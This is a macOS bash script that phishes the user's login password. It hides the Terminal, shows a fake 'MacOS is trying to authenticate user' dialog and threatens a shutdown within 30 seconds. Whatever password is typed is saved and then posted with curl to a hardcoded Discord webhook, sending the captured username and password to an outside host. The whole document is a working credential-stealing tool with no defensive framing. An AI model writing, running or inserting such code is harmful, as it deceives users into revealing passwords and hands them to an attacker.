#!/bin/bash

# Hide Terminal so only the AppleScript dialogs are visible
osascript -e 'tell app "Terminal" to set visible of front window to false'

# Get current username
username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')

# Prepare header for captured data
capture="username=${username}\n_________________________________________________________________________________________\n\n"

# Temporary file to store the entered password
tmpfile="/tmp/user_pass.txt"
rm -f "$tmpfile"

# Launch the password prompt in the background.
# This prompt does not include a timer so that input is not interrupted.
osascript -e 'set userPassword to text returned of (display dialog "MacOS is trying to authenticate user.
Enter the password for user " & (long user name of (system info)) & ":" with hidden answer)' > "$tmpfile" &

# Launch an informational dialog (non-interactive) that auto-dismisses after 30 seconds.
osascript -e 'display dialog "You have 30 seconds to enter your passcode before your computer shuts down." buttons {} giving up after 30' &

# Wait up to 30 seconds for the password prompt to complete.
timeout=30
while [ $timeout -gt 0 ]; do
    if [ -s "$tmpfile" ]; then
         break
    fi
    sleep 1
    timeout=$((timeout - 1))
done

# If no password was provided within 30 seconds, trigger shutdown.
if [ ! -s "$tmpfile" ]; then
    osascript -e 'do shell script "shutdown -h now" with administrator privileges'
fi

# Retrieve the entered password.
userPassword=$(cat "$tmpfile")
rm "$tmpfile"

# Append the password to the capture text.
capture="${capture}password=${userPassword}"

# Save captured data to pass.txt.
echo -e "$capture" > pass.txt

# Use Python to format a proper JSON payload and send it via Discord webhook.
if [[ -f pass.txt ]]; then
    payload=$(python3 -c 'import json,sys; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < pass.txt)
    curl -X POST -H "Content-Type: application/json" -d "$payload" https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B
    rm pass.txt
else
    echo "Error: pass.txt not found" > error.txt
fi
